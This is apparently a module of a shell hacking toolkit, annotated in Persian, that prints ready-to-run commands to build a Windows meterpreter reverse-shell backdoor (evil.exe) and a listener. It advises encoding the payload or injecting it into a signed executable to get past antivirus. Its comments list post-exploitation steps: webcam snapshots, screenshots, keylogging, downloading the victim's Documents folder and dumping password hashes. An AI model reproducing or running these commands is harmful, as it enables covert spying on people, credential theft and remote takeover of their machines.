DESC="ساخت بکدور ویندوز و شنونده"
REQ="msfvenom + IP عمومی"
RISK="HIGH"
NOTE="آنتی‌ویروس ویندوز ۱۰ به‌راحتی می‌گیرد؛ انکودر بزن یا payload را در exe امضا‌دار تزریق کن"

termux(){
cat <<'EOF'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o evil.exe
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
EOF
}

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o evil.exe

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"

# داخل session:
#   webcam_snap
#   screenshot
#   keyscan_start
#   keyscan_dump
#   download C:\\Users\\<u>\\Documents
#   hashdump
EOF
}
